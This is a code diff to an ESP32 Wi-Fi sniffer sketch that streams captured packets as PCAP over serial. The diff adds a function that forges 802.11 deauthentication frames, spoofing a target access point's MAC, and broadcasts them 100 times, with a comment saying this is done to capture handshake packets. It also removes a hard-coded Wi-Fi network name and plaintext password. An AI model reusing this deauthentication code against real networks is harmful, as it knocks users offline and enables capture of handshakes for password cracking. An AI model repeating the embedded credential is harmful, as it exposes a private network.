@@ -22,8 +22,8 @@
 #include "FS.h"
 #include "SD.h"
 #include "SPI.h"
-#include "PCAP.h"
-#include <cstring>
+#include <PCAP.h>
+
 
 //===== SETTINGS =====//
 #define CHANNEL 1
@@ -31,15 +31,15 @@
 #define CHANNEL_HOPPING true //if true it will scan on all channels
 #define MAX_CHANNEL 11 //(only necessary if channelHopping is true)
 #define HOP_INTERVAL 500 //in ms (only necessary if channelHopping is true)
-
+#define RXD2 16 // Receiver pin for UART 2 
+#define TXD2 17 // Transmitter pin for UART 2
 
 //===== Run-Time variables =====//
 PCAP pcap = PCAP();
 int ch = CHANNEL;
 unsigned long lastChannelChange = 0;
-unsigned long lastpcaprun = 0;
-unsigned long lastpcapwrite = 0;
-int a = 0;
+int rpiinput = 18; // to reboot ESP32 at the start of the node-red flow1
+//uint8_t mac_ap[6] = {0xd8, 0x47, 0x32, 0x18, 0xb2, 0xb8};
 
 //===== FUNCTIONS =====//
 
@@ -50,35 +50,63 @@ void sniffer(void *buf, wifi_promiscuous_pkt_type_t type){
   
   uint32_t timestamp = now(); //current timestamp 
   uint32_t microseconds = (unsigned int)(micros() - millis() * 1000); //micro seconds offset (0 - 999)
-  uint32_t orig_len = (unsigned int)ctrl.sig_len;
   
-  pcap.newPacketSerial(timestamp, microseconds, orig_len, pkt->payload); //send packet via Serial  
-  delay(600);
+  pcap.newPacketSerial(timestamp, microseconds, ctrl.sig_len, pkt->payload); //send packet via Serial 
+  delay(300); 
 }
 
-esp_err_t event_handler(void *ctx, system_event_t *event){ 
-  if (event->event_id == SYSTEM_EVENT_STA_GOT_IP){
-    //Serial.println("Our IP address is " IPSTR"\n", IP2STR(&event->event_info.got_ip.ip_info.ip));
-    Serial.println("IP ASSIGNED");
+// sending deauthentication packets to the wifi network to capture hansdshake pacakets 
+void deauthenticator(uint8_t mac_AP[6]){
+  uint8_t deauth[] = {
+    0x60, 0x00,                               // 0-1: Frame Control
+    0x00, 0x00,                               // 2-3: Duration
+    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,       // 4-9: Destination address (broadcast)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,       // 10-15: Source address
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,       // 16-21: BSSID
+    0x00, 0x00,                               // 22-23: Sequence / fragment number
+    0x07, 0x00,                               // 24-25: Deauthentication reason code 
+    
+  };
+
+  // replace the BSSID from the input parameter
+
+  deauth[10] = mac_AP[0];
+  deauth[11] = mac_AP[1];
+  deauth[12] = mac_AP[2];
+  deauth[13] = mac_AP[3];
+  deauth[14] = mac_AP[4];
+  deauth[15] = mac_AP[5];
+  deauth[16] = mac_AP[0];
+  deauth[17] = mac_AP[1];
+  deauth[18] = mac_AP[2];
+  deauth[19] = mac_AP[3];
+  deauth[20] = mac_AP[4];
+  deauth[21] = mac_AP[5];
+
+  // transmitting deauth packet 100 times on 0.1s interval 
+
+  for (int i = 0; i < 100; i++){
+    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, deauth, sizeof(deauth), true));
+    delay(100);
   }
-  if (event->event_id == SYSTEM_EVENT_STA_START){
-    ESP_ERROR_CHECK(esp_wifi_connect());
-    Serial.println("CONNECTED");
-  }
-  return ESP_OK; 
-  }
+}
+
+esp_err_t event_handler(void *ctx, system_event_t *event){ return ESP_OK; }
 
 
 //===== SETUP =====//
 void setup() {
-
+  //set pin mode to read the rpi reboot digital signal
+  pinMode(rpiinput, INPUT);
   /* start Serial */
   Serial.begin(BAUD_RATE);
-  delay(2000);
-  Serial.println();
+  Serial2.begin(BAUD_RATE, SERIAL_8N1, RXD2, TXD2);
+  //delay(2000);
   
   Serial.println("<<START>>");
-  
+  Serial2.println("<<START>>");
+  delay(3000);
+  pcap.startSerial();
 
   /* setup wifi */
   nvs_flash_init();
@@ -87,26 +115,25 @@ void setup() {
   wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
   ESP_ERROR_CHECK( esp_wifi_init(&cfg) );
   ESP_ERROR_CHECK( esp_wifi_set_storage(WIFI_STORAGE_RAM) );
-  ESP_ERROR_CHECK( esp_wifi_set_mode(WIFI_MODE_STA) );
-  wifi_config_t sta_config = { };
-
-  //Assign ssid & password strings
-  strcpy((char*)sta_config.sta.ssid, "WiFi-B2B7");
-  strcpy((char*)sta_config.sta.password, "44635237");
-  sta_config.sta.bssid_set = false;
-  ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_STA, &sta_config));  
+  ESP_ERROR_CHECK( esp_wifi_set_mode(WIFI_MODE_AP) );  
   ESP_ERROR_CHECK( esp_wifi_start() );
-  delay(2000);
   esp_wifi_set_promiscuous(true);
-  pcap.startSerial();
   esp_wifi_set_promiscuous_rx_cb(sniffer);
   wifi_second_chan_t secondCh = (wifi_second_chan_t)NULL;
   esp_wifi_set_channel(ch,secondCh);
+  
 }
 
 //===== LOOP =====//
 void loop() {
- 
+  /*while (Serial2.available()){
+    Serial.write(char(Serial2.read()));
+  }*/
+  // Restarting Esp32 
+  if (digitalRead(rpiinput) == HIGH){
+    Serial.println("Restarting Now");
+    ESP.restart();
+  }
   /* Channel Hopping */
   if(CHANNEL_HOPPING){
     unsigned long currentTime = millis();
@@ -117,9 +144,6 @@ void loop() {
       wifi_second_chan_t secondCh = (wifi_second_chan_t)NULL;
       esp_wifi_set_channel(ch,secondCh);
     }
-    
-    
   }
-  
   
 }
